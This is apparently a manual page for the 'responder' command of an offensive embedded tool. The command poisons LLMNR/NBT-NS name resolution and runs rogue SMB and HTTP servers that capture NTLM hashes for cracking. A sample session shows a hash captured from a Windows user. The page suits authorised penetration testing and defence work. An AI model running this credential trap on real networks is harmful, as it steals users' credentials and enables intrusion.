# responder

Category: mitm & poisoning

Summary: LLMNR/NBT-NS poisoning + NTLM/Basic credential trap

Usage:

```
responder on | off | status | clear
```

Manual:

```
DESCRIPTION
    Answers LLMNR (UDP/5355) and NBT-NS (UDP/137) name queries with
    this device's IP, so Windows hosts whose DNS lookup fails (typo'd
    share names, stale drive mappings) connect here instead. Rogue SMB
    (TCP/445) and HTTP (TCP/80) servers then ask for NTLM
    authentication and record the response. Captures are printed live
    and appended to /loot/responder_ntlm.txt on the SD card, one
    hashcat-ready line each (-m 5600 NTLMv2, -m 5500 NTLMv1).
    Every answered query and incoming connection is logged.

SUBCOMMANDS
    on      Start poisoning and the SMB/HTTP servers.
    off     Stop.
    status  Queries answered and the captures so far (also shown by
            'responder' with no arguments).
    clear   Forget the captures held in memory (the SD file is kept).

EXAMPLES
    root@espjack# responder on
    [RESPONDER] LLMNR/NBT-NS poisoning + HTTP/SMB credential trap active.
    Responder started in background.
    (a user on 192.168.1.23 opens \\fileserv\share, which doesn't exist)
    [RESPONDER] LLMNR A query for 'fileserv' from 192.168.1.23 -> answered with 192.168.1.42
    [RESPONDER] SMB connection from 192.168.1.23
    [RESPONDER] captured ntlmv2 user=jsmith domain=CORP client=192.168.1.23

    root@espjack# responder status
      running:          yes
      queries answered: 3
      captures (1):
        TYPE     USER               DOMAIN         CLIENT               HASH
        ntlmv2   jsmith             CORP           192.168.1.23         jsmith::CORP:1122334455667788:9a8b7c...:010100...
```
